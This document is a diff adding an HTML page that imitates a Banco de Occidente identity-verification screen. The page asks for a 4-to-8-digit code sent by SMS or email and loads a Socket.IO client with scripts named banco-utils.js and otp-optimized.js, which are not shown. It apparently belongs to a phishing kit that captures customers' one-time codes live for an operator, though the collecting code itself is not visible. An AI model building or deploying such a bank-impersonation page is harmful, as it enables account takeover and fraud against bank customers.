@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <link rel="icon" type="image/x-icon" href="img/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco de Occidente - Verificación OTP</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Seguridad Badge -->
+        <div class="security-badge">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2L4 6V11C4 16.55 7.84 21.74 13 23C18.16 21.74 22 16.55 22 11V6L12 2ZM10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z" fill="#00C853"/>
+            </svg>
+            <span>Seguridad</span>
+        </div>
+
+        <!-- Main Card -->
+        <div class="card">
+            <!-- Logo -->
+            <div class="logo-container">
+                <img src="img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg" alt="Banco de Occidente" class="logo">
+            </div>
+
+            <!-- Title -->
+            <div class="welcome-text">
+                <p class="welcome">Verificación de identidad</p>
+                <p class="portal-title">Código de Verificación</p>
+            </div>
+
+            <!-- Info Message -->
+            <div class="info-box">
+                <p>Hemos enviado un <strong>código de verificación</strong> a tu celular registrado y/o correo electrónico.</p>
+            </div>
+
+            <!-- Form -->
+            <form class="login-form" id="form-otp">
+                <!-- OTP Field -->
+                <div class="form-group">
+                    <label for="otp">Código de verificación</label>
+                    <input 
+                        type="text" 
+                        id="otp" 
+                        placeholder="Ingresa el código" 
+                        class="input-field input-otp" 
+                        maxlength="8"
+                        pattern="[0-9]{4,8}"
+                        required
+                        autocomplete="off"
+                    >
+                    <div class="otp-info">
+                        <span>El código contiene entre 4 y 8 dígitos</span>
+                    </div>
+                </div>
+
+                <!-- Method Selection -->
+                <div class="form-group">
+                    <label>Método de recepción</label>
+                    <div class="radio-group">
+                        <label class="radio-label">
+                            <input type="radio" name="metodo" value="SMS" checked>
+                            <span class="radio-custom"></span>
+                            <span class="radio-text">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M20 2H4C2.9 2 2 2.9 2 4V22L6 18H20C21.1 18 22 17.1 22 16V4C22 2.9 21.1 2 20 2ZM20 16H6L4 18V4H20V16Z" fill="#666"/>
+                                </svg>
+                                Mensaje de texto (SMS)
+                            </span>
+                        </label>
+                        <label class="radio-label">
+                            <input type="radio" name="metodo" value="Email">
+                            <span class="radio-custom"></span>
+                            <span class="radio-text">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M20 4H4C2.9 4 2 4.9 2 6V18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6C22 4.9 21.1 4 20 4ZM20 8L12 13L4 8V6L12 11L20 6V8Z" fill="#666"/>
+                                </svg>
+                                Correo electrónico
+                            </span>
+                        </label>
+                    </div>
+                </div>
+
+                <!-- Help Text -->
+                <div class="help-text">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#666"/>
+                    </svg>
+                    <span>Si no recibiste el código, espera unos segundos y revisa tu bandeja de spam</span>
+                </div>
+
+                <!-- Resend Link -->
+                <div class="resend-link">
+                    <a href="#" id="resendCode">¿No recibiste el código? Reenviar</a>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="button" class="btn-login" id="btnVerificar" disabled>
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M9 16.17L4.83 12L3.41 13.41L9 19L21 7L19.59 5.59L9 16.17Z" fill="white"/>
+                    </svg>
+                    Verificar Código
+                </button>
+
+                <!-- Back Link -->
+                <div class="back-link">
+                    <a href="/index.html">← Volver al inicio</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <img src="img/spinner_occidente.gif" alt="Cargando..." class="loading-spinner">
+            <p class="loading-text">Verificando código...</p>
+        </div>
+    </div>
+
+    <!-- Socket.IO Client -->
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script src="otp-optimized.js"></script>
+</body>
+</html>
